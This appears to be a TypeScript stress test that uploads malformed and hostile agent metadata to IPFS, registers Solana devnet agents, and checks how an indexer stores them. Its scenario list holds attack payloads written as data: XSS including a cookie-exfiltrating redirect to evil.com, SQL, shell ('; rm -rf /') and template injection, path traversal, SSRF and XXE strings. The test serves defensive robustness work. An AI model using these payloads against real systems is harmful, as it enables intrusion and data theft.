/**
 * Off-Chain Metadata Stress Test with REAL IPFS (Pinata)
 *
 * Uploads various malformed/edge case JSON to IPFS and creates
 * agents pointing to them to test indexer robustness.
 *
 * Scenarios tested:
 * - Valid JSON with edge cases
 * - Malformed JSON
 * - XSS/Injection attempts
 * - Huge files
 * - Unicode chaos
 * - Non-JSON content
 */

import { Keypair, Connection } from '@solana/web3.js';
import { SolanaSDK } from '../../src/core/sdk-solana.js';
import { IPFSClient } from '../../src/core/ipfs-client.js';
import * as fs from 'fs';
import * as path from 'path';

// ============ CONFIG ============
const HELIUS_API_KEY = process.env.HELIUS_API_KEY;
const HELIUS_DEVNET_RPC =
  process.env.HELIUS_DEVNET_URL ||
  (HELIUS_API_KEY ? `https://devnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}` : undefined);


// Pinata JWT from 8004-solana-mcp/.env
const PINATA_JWT = process.env.PINATA_JWT;

const CONFIG = {
  INDEXER_URL: 'https://uhjytdjxvfbppgjicfly.supabase.co/rest/v1',
  SUPABASE_ANON_KEY: 'sb_publishable_i-ycBRGiolBr8GMdiVq1rA_nwt7N2bq',
};

// ============ UTILITIES ============
function loadKeypair(filePath: string): Keypair {
  const keyData = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  return Keypair.fromSecretKey(Uint8Array.from(keyData));
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function randomHex(len: number): string {
  return Array(len).fill(0).map(() => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
}

// ============ METADATA SCENARIOS ============
interface MetadataScenario {
  name: string;
  description: string;
  content: string | object;  // String for raw content, object for JSON
  expectedBehavior: 'should_parse' | 'should_fail_gracefully' | 'edge_case';
}

const METADATA_SCENARIOS: MetadataScenario[] = [
  // ====== VALID JSON - STANDARD ======
  {
    name: 'valid_minimal',
    description: 'Minimal valid metadata',
    content: { name: `Test Agent ${Date.now()}` },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'valid_complete',
    description: 'Complete valid metadata',
    content: {
      name: 'Complete Test Agent',
      symbol: 'CTA',
      description: 'A fully specified AI agent for stress testing',
      image: 'https://example.com/image.png',
      external_url: 'https://example.com',
      animation_url: 'https://example.com/animation.mp4',
      attributes: [
        { trait_type: 'version', value: '1.0.0' },
        { trait_type: 'model', value: 'gpt-4-turbo' },
        { trait_type: 'capability', value: 'code-generation' },
        { trait_type: 'uptime', value: '99.9%' },
      ],
      properties: {
        category: 'ai-agent',
        creators: [{ address: '11111111111111111111111111111111', share: 100 }],
        files: [{ uri: 'https://example.com/model.bin', type: 'application/octet-stream' }],
      },
    },
    expectedBehavior: 'should_parse',
  },

  // ====== VALID JSON - UNICODE ======
  {
    name: 'unicode_japanese',
    description: 'Japanese characters',
    content: {
      name: '日本語エージェント',
      description: '人工知能エージェントのテスト',
      attributes: [{ trait_type: 'バージョン', value: 'v1.0' }],
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'unicode_chinese',
    description: 'Chinese characters',
    content: {
      name: '中文代理',
      description: '人工智能代理测试',
      attributes: [{ trait_type: '版本', value: 'v1.0' }],
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'unicode_arabic',
    description: 'Arabic (RTL) characters',
    content: {
      name: 'وكيل اختبار',
      description: 'وكيل اختبار الذكاء الاصطناعي',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'unicode_emoji',
    description: 'Emoji characters',
    content: {
      name: 'Agent 🤖💯',
      description: '✅ Working AI Agent 🚀🔥',
      attributes: [
        { trait_type: 'Status', value: '✅ Active' },
        { trait_type: 'Rating', value: '⭐⭐⭐⭐⭐' },
      ],
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'unicode_mixed',
    description: 'Mixed unicode from many languages',
    content: {
      name: 'Global Agent 🌍',
      description: 'English 日本語 中文 العربية Русский 한국어',
      attributes: [
        { trait_type: 'Test', value: 'Pass ✓ Passed 合格 通过 نجح Успех 합격' },
      ],
    },
    expectedBehavior: 'should_parse',
  },

  // ====== VALID JSON - EDGE CASES ======
  {
    name: 'empty_object',
    description: 'Empty JSON object',
    content: {},
    expectedBehavior: 'edge_case',
  },
  {
    name: 'null_fields',
    description: 'Null values in fields',
    content: {
      name: null,
      description: null,
      image: null,
      attributes: null,
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'empty_strings',
    description: 'Empty string values',
    content: {
      name: '',
      description: '',
      image: '',
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'whitespace_strings',
    description: 'Whitespace-only values',
    content: {
      name: '   \t\n   ',
      description: '\n\n\n',
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'wrong_types',
    description: 'Wrong types for fields',
    content: {
      name: 12345,
      description: true,
      image: { url: 'nested' },
      attributes: 'not an array',
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'deep_nesting',
    description: 'Deeply nested objects',
    content: {
      name: 'Deep Agent',
      properties: {
        l1: { l2: { l3: { l4: { l5: { l6: { l7: { l8: { l9: { l10: { value: 'deep!' } } } } } } } } } },
      },
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'huge_attributes',
    description: 'Very large attributes array',
    content: {
      name: 'Array Agent',
      attributes: Array(500).fill(0).map((_, i) => ({
        trait_type: `trait_${i}`,
        value: `value_${i}_${'x'.repeat(50)}`,
      })),
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'huge_description',
    description: '50KB description',
    content: {
      name: 'Huge Description Agent',
      description: 'X'.repeat(50000),
    },
    expectedBehavior: 'edge_case',
  },

  // ====== SECURITY - XSS ======
  {
    name: 'xss_script_tag',
    description: 'XSS via script tag',
    content: {
      name: '<script>alert("XSS")</script>',
      description: '<script>document.location="http://evil.com?c="+document.cookie</script>',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'xss_img_onerror',
    description: 'XSS via img onerror',
    content: {
      name: '<img src=x onerror=alert(1)>',
      description: '<img src="invalid" onerror="eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))">',
      image: 'javascript:alert(1)',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'xss_svg',
    description: 'XSS via SVG',
    content: {
      name: '<svg onload=alert(1)>',
      description: '<svg><script>alert(1)</script></svg>',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'xss_event_handlers',
    description: 'XSS via event handlers',
    content: {
      name: 'Agent" onclick="alert(1)" data-x="',
      description: '<div onmouseover="alert(1)">Hover me</div>',
    },
    expectedBehavior: 'should_parse',
  },

  // ====== SECURITY - INJECTION ======
  {
    name: 'sql_injection',
    description: 'SQL injection attempts',
    content: {
      name: "'; DROP TABLE agents; --",
      description: "1' OR '1'='1",
      attributes: [{ trait_type: "' UNION SELECT * FROM users --", value: 'test' }],
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'nosql_injection',
    description: 'NoSQL injection attempts',
    content: {
      name: '{"$gt": ""}',
      description: '{"$where": "this.password.length > 0"}',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'template_injection',
    description: 'Template injection attempts',
    content: {
      name: '${process.env.SECRET}',
      description: '{{constructor.constructor("return this")()}}',
      image: '#{system("whoami")}',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'prototype_pollution',
    description: 'Prototype pollution attempt',
    content: {
      name: 'Pollution Agent',
      __proto__: { polluted: true },
      constructor: { prototype: { polluted: true } },
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'path_traversal',
    description: 'Path traversal in URLs',
    content: {
      name: 'Traversal Agent',
      image: '../../etc/passwd',
      external_url: 'file:///etc/passwd',
      animation_url: '../../../../../../../etc/shadow',
    },
    expectedBehavior: 'should_parse',
  },

  // ====== MALFORMED JSON (as strings) ======
  {
    name: 'malformed_missing_quotes',
    description: 'Missing quotes in JSON',
    content: '{ name: "missing quotes around key" }',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'malformed_trailing_comma',
    description: 'Trailing comma in JSON',
    content: '{ "name": "trailing comma", }',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'malformed_single_quotes',
    description: 'Single quotes instead of double',
    content: "{ 'name': 'single quotes' }",
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'malformed_truncated',
    description: 'Truncated JSON',
    content: '{ "name": "Truncated',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'malformed_unbalanced',
    description: 'Unbalanced braces',
    content: '{ "name": "Unbalanced" }}',
    expectedBehavior: 'should_fail_gracefully',
  },

  // ====== NON-JSON CONTENT ======
  {
    name: 'plain_text',
    description: 'Plain text content',
    content: 'This is not JSON at all, just plain text.',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'html_content',
    description: 'HTML content',
    content: '<!DOCTYPE html><html><body><h1>Not JSON</h1></body></html>',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'xml_content',
    description: 'XML content',
    content: '<?xml version="1.0"?><agent><name>XML Agent</name></agent>',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'json_null',
    description: 'JSON null literal',
    content: 'null',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'json_array',
    description: 'JSON array instead of object',
    content: '["not", "an", "object"]',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'json_string',
    description: 'JSON string literal',
    content: '"just a string"',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'json_number',
    description: 'JSON number literal',
    content: '42',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'empty_content',
    description: 'Empty content',
    content: '',
    expectedBehavior: 'should_fail_gracefully',
  },

  // ====== SPECIAL CHARACTERS ======
  {
    name: 'control_characters',
    description: 'Control characters in strings',
    content: {
      name: 'Agent\x00\x01\x02\x03',
      description: 'Tab:\t Newline:\n Carriage:\r',
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'ansi_escape',
    description: 'ANSI escape codes',
    content: {
      name: '\x1b[31mRED\x1b[0m Agent',
      description: '\x1b[1mBOLD\x1b[0m text',
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'zero_width_chars',
    description: 'Zero-width characters',
    content: {
      name: 'Agent\u200B\u200C\u200D\uFEFF',  // Zero-width space, non-joiner, joiner, BOM
      description: 'Invisible\u2060characters\u2063here',
    },
    expectedBehavior: 'edge_case',
  },

  // ====== EXTREME MALFORMED ======
  {
    name: 'bom_marker',
    description: 'UTF-8 BOM at start',
    content: '\uFEFF{"name": "BOM Agent"}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'binary_garbage',
    description: 'Binary data pretending to be JSON',
    content: '\x00\x01\x02\x03\x04\x05{"name":"\x89PNG\r\n"}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'recursive_like',
    description: 'Simulated circular reference pattern',
    content: '{"name":"Loop","self":{"$ref":"#"},"parent":{"$ref":"#/parent"}}',
    expectedBehavior: 'edge_case',
  },
  {
    name: 'number_overflow',
    description: 'Numbers that overflow JS',
    content: '{"name":"Overflow Agent","bigNumber":99999999999999999999999999999999999999999999999999,"negOverflow":-99999999999999999999999999999999999999999999999999,"scientific":1e+308}',
    expectedBehavior: 'edge_case',
  },
  {
    name: 'infinity_nan',
    description: 'Infinity and NaN (invalid JSON)',
    content: '{"name":"Math Agent","inf":Infinity,"nan":NaN,"negInf":-Infinity}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'undefined_value',
    description: 'undefined value (invalid JSON)',
    content: '{"name":"Undefined Agent","value":undefined}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'multiline_string',
    description: 'Unescaped multiline string',
    content: '{"name":"Line\nBreak\nAgent"}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'tab_in_string',
    description: 'Unescaped tab in string',
    content: '{"name":"Tab	Agent"}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'comments_json',
    description: 'JSON with comments (invalid)',
    content: '{\n  // This is a comment\n  "name": "Comment Agent",\n  /* block comment */\n  "value": 123\n}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'duplicate_keys',
    description: 'Duplicate keys in object',
    content: '{"name":"First","name":"Second","name":"Third"}',
    expectedBehavior: 'edge_case',
  },
  {
    name: 'very_deep_nesting',
    description: '50 levels deep nesting',
    content: Array(50).fill('{"a":').join('') + '"deep"' + Array(50).fill('}').join(''),
    expectedBehavior: 'edge_case',
  },
  {
    name: 'unicode_escape_invalid',
    description: 'Invalid unicode escape sequence',
    content: '{"name":"\\uZZZZ invalid escape"}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'backslash_chaos',
    description: 'Backslash chaos',
    content: '{"name":"Back\\slash\\\\Agent\\\\\\"}',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'huge_key',
    description: '10KB key name',
    content: `{"name":"Big Key Agent","${'K'.repeat(10000)}":"value"}`,
    expectedBehavior: 'edge_case',
  },
  {
    name: 'json5_features',
    description: 'JSON5 features (invalid standard JSON)',
    content: "{name: 'single quotes', trailing: true,}",
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'yaml_like',
    description: 'YAML-like content',
    content: 'name: YAML Agent\ndescription: Not JSON at all\nattributes:\n  - key: value',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'toml_like',
    description: 'TOML-like content',
    content: '[agent]\nname = "TOML Agent"\nversion = "1.0"',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'csv_content',
    description: 'CSV content',
    content: 'name,description,value\n"CSV Agent","Not JSON",123\n"Row2","Data",456',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'markdown_content',
    description: 'Markdown content',
    content: '# Agent Name\n\n**Description**: This is markdown, not JSON\n\n- Feature 1\n- Feature 2',
    expectedBehavior: 'should_fail_gracefully',
  },
  {
    name: 'latex_commands',
    description: 'LaTeX commands in values',
    content: {
      name: 'LaTeX Agent \\textbf{bold}',
      description: '$\\sum_{i=0}^{n} x_i$ formula',
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'regex_pattern',
    description: 'Regex patterns in values',
    content: {
      name: '/^Agent[0-9]+$/',
      pattern: '(?:(?:\\r\\n)?[ \\t])*',
      replacement: '$1.$2',
    },
    expectedBehavior: 'edge_case',
  },
  {
    name: 'shell_injection',
    description: 'Shell injection attempts',
    content: {
      name: '$(whoami)',
      description: '`cat /etc/passwd`',
      command: '; rm -rf /',
      env: '${PATH}',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'ssrf_attempts',
    description: 'SSRF in URLs',
    content: {
      name: 'SSRF Agent',
      image: 'http://169.254.169.254/latest/meta-data/',
      external_url: 'http://localhost:22',
      animation_url: 'http://[::1]:8080/admin',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'xxe_attempt',
    description: 'XXE payload (even in JSON)',
    content: {
      name: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      description: '&xxe;',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'ldap_injection',
    description: 'LDAP injection attempt',
    content: {
      name: '*)(uid=*))(|(uid=*',
      query: '(&(objectClass=*)(uid=admin))',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'jwt_in_name',
    description: 'JWT token as name',
    content: {
      name: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
    },
    expectedBehavior: 'should_parse',
  },
  {
    name: 'base64_payload',
    description: 'Base64 encoded payload',
    content: {
      name: 'Base64 Agent',
      data: 'PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=', // <script>alert('xss')</script>
      image: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=',
    },
    expectedBehavior: 'should_parse',
  },
];

// ============ IPFS UPLOAD ============
interface UploadedMetadata {
  scenario: MetadataScenario;
  cid: string;
  uri: string;
}

async function uploadMetadataToIPFS(ipfs: IPFSClient, scenarios: MetadataScenario[]): Promise<UploadedMetadata[]> {
  const uploaded: UploadedMetadata[] = [];

  for (const scenario of scenarios) {
    try {
      console.log(`  Uploading: ${scenario.name}...`);

      // Determine content
      let content: string;
      if (typeof scenario.content === 'string') {
        content = scenario.content;
      } else {
        content = JSON.stringify(scenario.content);
      }

      // Upload to Pinata
      const response = await fetch('https://api.pinata.cloud/pinning/pinJSONToIPFS', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${PINATA_JWT}`,
        },
        body: JSON.stringify({
          pinataContent: typeof scenario.content === 'string'
            ? { rawContent: scenario.content }  // Wrap raw strings in an object
            : scenario.content,
          pinataMetadata: {
            name: `stress-test-${scenario.name}-${Date.now()}`,
          },
        }),
      });

      if (!response.ok) {
        const error = await response.text();
        console.log(`    ❌ Upload failed: ${error.slice(0, 100)}`);
        continue;
      }

      const result = await response.json();
      const cid = result.IpfsHash;
      const uri = `ipfs://${cid}`;

      uploaded.push({ scenario, cid, uri });
      console.log(`    ✅ ${scenario.name}: ${cid}`);

      await sleep(500); // Rate limiting
    } catch (error: any) {
      console.log(`    ❌ ${scenario.name}: ${error.message.slice(0, 80)}`);
    }
  }

  return uploaded;
}

// Upload raw content as files (for string content - malformed JSON, edge cases, etc.)
async function uploadRawToIPFS(scenarios: MetadataScenario[]): Promise<UploadedMetadata[]> {
  const uploaded: UploadedMetadata[] = [];

  // All scenarios passed should have string content
  for (const scenario of scenarios) {
    if (typeof scenario.content !== 'string') continue;
    try {
      console.log(`  Uploading raw: ${scenario.name}...`);

      const content = scenario.content as string;

      // Use Node.js compatible approach for file upload
      const boundary = `----FormBoundary${Date.now()}`;
      const fileName = `${scenario.name}.json`; // .json extension to trick parsers

      const bodyParts = [
        `--${boundary}`,
        `Content-Disposition: form-data; name="file"; filename="${fileName}"`,
        'Content-Type: application/json',
        '',
        content,
        `--${boundary}`,
        'Content-Disposition: form-data; name="pinataMetadata"',
        'Content-Type: application/json',
        '',
        JSON.stringify({ name: `stress-raw-${scenario.name}-${Date.now()}` }),
        `--${boundary}--`,
      ].join('\r\n');

      const response = await fetch('https://api.pinata.cloud/pinning/pinFileToIPFS', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${PINATA_JWT}`,
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
        },
        body: bodyParts,
      });

      if (!response.ok) {
        const error = await response.text();
        console.log(`    ❌ Upload failed: ${error.slice(0, 100)}`);
        continue;
      }

      const result = await response.json();
      const cid = result.IpfsHash;
      const uri = `ipfs://${cid}`;

      uploaded.push({ scenario, cid, uri });
      console.log(`    ✅ ${scenario.name}: ${cid}`);

      await sleep(500);
    } catch (error: any) {
      console.log(`    ❌ ${scenario.name}: ${error.message.slice(0, 80)}`);
    }
  }

  return uploaded;
}

// ============ MAIN TEST ============
async function runOffchainIPFSTest(): Promise<void> {
  console.log('\n' + '='.repeat(70));
  console.log('   OFF-CHAIN METADATA STRESS TEST (REAL IPFS)');
  console.log('='.repeat(70));

  // Setup
  const rpcUrl = process.env.SOLANA_RPC_URL || HELIUS_DEVNET_RPC || 'https://api.devnet.solana.com';
  const walletPath = process.env.SOLANA_WALLET_PATH ||
    path.join(process.env.HOME!, '.config/solana/id.json');
  const mainWallet = loadKeypair(walletPath);

  const connection = new Connection(rpcUrl);
  const balance = await connection.getBalance(mainWallet.publicKey);

  console.log(`\n🔗 RPC: ${rpcUrl.includes('helius') ? 'Helius' : 'Public'}`);
  console.log(`💰 Balance: ${(balance / 1e9).toFixed(4)} SOL`);
  console.log(`📊 Scenarios to test: ${METADATA_SCENARIOS.length}`);

  if (!PINATA_JWT) {
    throw new Error('Missing PINATA_JWT. Set PINATA_JWT to run this stress test.');
  }

  // IPFS Client
  const ipfs = new IPFSClient({
    pinataEnabled: true,
    pinataJwt: PINATA_JWT,
  });

  const sdk = new SolanaSDK({
    rpcUrl,
    signer: mainWallet,
    indexerUrl: CONFIG.INDEXER_URL,
  });

  // Phase 1: Upload metadata to IPFS
  console.log('\n📤 Phase 1: Uploading metadata to IPFS (Pinata)...\n');

  // Separate scenarios by content type
  const objectScenarios = METADATA_SCENARIOS.filter(s => typeof s.content === 'object');
  const stringScenarios = METADATA_SCENARIOS.filter(s => typeof s.content === 'string');

  console.log(`  Object scenarios: ${objectScenarios.length}`);
  console.log(`  String scenarios: ${stringScenarios.length}\n`);

  // Upload object content as JSON
  const uploadedJson = await uploadMetadataToIPFS(ipfs, objectScenarios);

  // Upload string content as raw files (malformed JSON, etc.)
  console.log('\n  Uploading string content as raw files...');
  const uploadedRaw = await uploadRawToIPFS(stringScenarios);

  const allUploaded = [...uploadedJson, ...uploadedRaw];
  console.log(`\n  ✅ Total uploaded: ${allUploaded.length}`);

  // Phase 2: Create agents with uploaded metadata
  console.log('\n🤖 Phase 2: Creating agents with uploaded metadata...\n');

  const results: Array<{
    scenario: string;
    uri: string;
    agentCreated: boolean;
    agentId?: string;
    error?: string;
  }> = [];

  for (const uploaded of allUploaded) {
    console.log(`  Creating agent: ${uploaded.scenario.name}`);
    console.log(`    URI: ${uploaded.uri}`);

    try {
      const result = await sdk.registerAgent(uploaded.uri);

      if (result.success && result.asset) {
        console.log(`    ✅ Created: ${result.asset.toBase58()}`);
        results.push({
          scenario: uploaded.scenario.name,
          uri: uploaded.uri,
          agentCreated: true,
          agentId: result.asset.toBase58(),
        });

        // Initialize ATOM
        try {
          await sdk.initializeAtomStats(result.asset);
        } catch (e) {
          // May already be initialized
        }
      } else {
        console.log(`    ❌ Failed: ${result.error || 'Unknown'}`);
        results.push({
          scenario: uploaded.scenario.name,
          uri: uploaded.uri,
          agentCreated: false,
          error: result.error,
        });
      }
    } catch (error: any) {
      console.log(`    ❌ Error: ${error.message.slice(0, 80)}`);
      results.push({
        scenario: uploaded.scenario.name,
        uri: uploaded.uri,
        agentCreated: false,
        error: error.message,
      });
    }

    await sleep(2000); // Rate limiting
  }

  // Phase 3: Wait for indexer
  console.log('\n⏳ Phase 3: Waiting 30s for indexer to process...');
  await sleep(30000);

  // Phase 4: Verify indexer data
  console.log('\n🔍 Phase 4: Verifying indexed data...\n');

  const headers = {
    'apikey': CONFIG.SUPABASE_ANON_KEY,
    'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`,
    'Content-Type': 'application/json',
  };

  const indexerResults: Array<{
    scenario: string;
    agentId: string;
    indexed: boolean;
    nftName?: string;
    metadataFetched?: boolean;
    tokenUri?: string;
  }> = [];

  for (const result of results.filter(r => r.agentCreated && r.agentId)) {
    try {
      const response = await fetch(
        `${CONFIG.INDEXER_URL}/agents?asset=eq.${result.agentId}`,
        { headers }
      );

      if (response.ok) {
        const data = await response.json();
        if (data.length > 0) {
          const agent = data[0];
          indexerResults.push({
            scenario: result.scenario,
            agentId: result.agentId!,
            indexed: true,
            nftName: agent.nft_name,
            metadataFetched: agent.metadata_fetched,
            tokenUri: agent.token_uri,
          });
          console.log(`  ✅ ${result.scenario}: indexed (name: ${agent.nft_name || 'null'})`);
        } else {
          indexerResults.push({
            scenario: result.scenario,
            agentId: result.agentId!,
            indexed: false,
          });
          console.log(`  ⚠️ ${result.scenario}: not found in index`);
        }
      }
    } catch (e: any) {
      console.log(`  ❌ ${result.scenario}: check failed`);
    }

    await sleep(200);
  }

  // Phase 5: Report
  console.log('\n' + '='.repeat(70));
  console.log('   OFF-CHAIN METADATA TEST REPORT');
  console.log('='.repeat(70));

  const agentsCreated = results.filter(r => r.agentCreated).length;
  const agentsIndexed = indexerResults.filter(r => r.indexed).length;

  console.log(`\n📊 Summary:`);
  console.log(`  Scenarios tested: ${METADATA_SCENARIOS.length}`);
  console.log(`  Uploaded to IPFS: ${allUploaded.length}`);
  console.log(`  Agents created: ${agentsCreated}`);
  console.log(`  Agents indexed: ${agentsIndexed}`);

  // Group by expected behavior
  const byBehavior: Record<string, {
    total: number;
    created: number;
    indexed: number;
    examples: string[];
  }> = {
    should_parse: { total: 0, created: 0, indexed: 0, examples: [] },
    should_fail_gracefully: { total: 0, created: 0, indexed: 0, examples: [] },
    edge_case: { total: 0, created: 0, indexed: 0, examples: [] },
  };

  for (const uploaded of allUploaded) {
    const behavior = uploaded.scenario.expectedBehavior;
    byBehavior[behavior].total++;

    const createResult = results.find(r => r.scenario === uploaded.scenario.name);
    if (createResult?.agentCreated) {
      byBehavior[behavior].created++;

      const indexResult = indexerResults.find(r => r.scenario === uploaded.scenario.name);
      if (indexResult?.indexed) {
        byBehavior[behavior].indexed++;
        if (indexResult.nftName) {
          byBehavior[behavior].examples.push(`${uploaded.scenario.name}: "${indexResult.nftName.slice(0, 30)}"`);
        }
      }
    }
  }

  console.log(`\n📈 By Expected Behavior:`);
  for (const [behavior, stats] of Object.entries(byBehavior)) {
    console.log(`  ${behavior}:`);
    console.log(`    Created: ${stats.created}/${stats.total}`);
    console.log(`    Indexed: ${stats.indexed}/${stats.created}`);
    if (stats.examples.length > 0) {
      console.log(`    Examples: ${stats.examples.slice(0, 3).join(', ')}`);
    }
  }

  // Security findings
  console.log(`\n🔐 Security Observations:`);

  const xssIndexed = indexerResults.filter(r =>
    r.indexed && (
      r.nftName?.includes('<script>') ||
      r.nftName?.includes('onerror') ||
      r.nftName?.includes('onclick')
    )
  );

  if (xssIndexed.length > 0) {
    console.log(`  ⚠️ XSS content stored unsanitized: ${xssIndexed.length}`);
    for (const r of xssIndexed.slice(0, 3)) {
      console.log(`    - ${r.scenario}: "${r.nftName?.slice(0, 50)}"`);
    }
  } else {
    console.log(`  ✅ No XSS content found in indexed names`);
  }

  const sqlIndexed = indexerResults.filter(r =>
    r.indexed && (
      r.nftName?.includes('DROP TABLE') ||
      r.nftName?.includes('UNION SELECT')
    )
  );

  if (sqlIndexed.length > 0) {
    console.log(`  ⚠️ SQL injection content stored: ${sqlIndexed.length}`);
  } else {
    console.log(`  ✅ No SQL injection content found in indexed names`);
  }

  console.log('\n' + '='.repeat(70));
}

// Run
runOffchainIPFSTest()
  .then(() => {
    console.log('\n✅ Off-chain IPFS metadata test completed!');
    process.exit(0);
  })
  .catch(error => {
    console.error('\n❌ Test failed:', error.message);
    process.exit(1);
  });
